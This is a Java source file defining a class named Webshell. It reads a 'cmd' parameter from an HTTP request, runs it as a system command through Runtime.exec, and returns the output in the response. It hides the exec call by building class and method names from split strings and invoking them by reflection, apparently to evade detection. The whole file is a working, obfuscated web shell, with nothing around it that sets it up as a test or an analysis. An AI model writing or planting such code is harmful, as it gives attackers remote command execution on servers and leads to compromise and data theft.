package org.sec.config;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class Webshell {
  public static void invoke(
      HttpServletRequest request, HttpServletResponse response, PrintWriter out) {
    try {

      String cmd = request.getParameter("cmd");
      String name = "java.lang." + "Runtime";
      Class rt = Class.forName(name);
      String a = "getRu";
      String b = "ntime";
      java.lang.reflect.Method gr = rt.getMethod(a + b);
      String d = "ex";
      String e = "ec";
      String f = d + e;
      java.lang.reflect.Method ex = rt.getMethod(f, String.class);
      Object obj = gr.invoke(null);
      Process process = (Process) ex.invoke(obj, cmd);

      java.io.InputStream in = process.getInputStream();
      out.print("<pre>");
      java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
      java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
      String s = null;
      while ((s = stdInput.readLine()) != null) {
        out.println(s);
      }
      out.print("</pre>");

    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
